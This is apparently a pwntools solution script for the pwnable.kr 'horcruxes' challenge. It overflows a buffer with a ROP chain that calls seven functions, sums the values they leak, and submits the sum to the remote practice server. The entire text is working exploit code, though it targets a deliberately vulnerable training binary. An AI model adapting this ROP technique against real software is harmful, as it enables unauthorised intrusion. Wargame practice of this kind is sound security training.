from pwn import *
from numpy import int32
context.clear(arch='i386', os='linux')
context.log_level = 'debug'
context.binary = e = ELF('./horcruxes')
clean_main = p64(0x0809fffc) # do ropme again
rop = ROP(e, badchars='\x0a\x0d')
rop.raw(b'\x00'*(0x74+4))
rop.A()
rop.B()
rop.C() 
rop.D()
rop.E()
rop.F()
rop.G()
rop.raw(clean_main)
#print(rop.dump())
#print(rop.chain())
#r = process('./horcruxes', env={'LD_PRELOAD': './libseccomp.so.2'})
#r = gdb.debug('./horcruxes', 'break *0x080a0176\ncontinue', env={'LD_PRELOAD': './libseccomp.so.2'})
r = remote('pwnable.kr', 9032)
r.sendline(b'0')
r.sendline(rop.chain())
s = int32(0)
for _ in range(7):
	n = int32(r.recvuntil(b')', drop=True).split(b'+')[1])
	#print(n)
	s += n 

print(s)
r.sendlineafter(b':', b'0')
r.sendlineafter(b':', str(s).encode())
r.interactive()
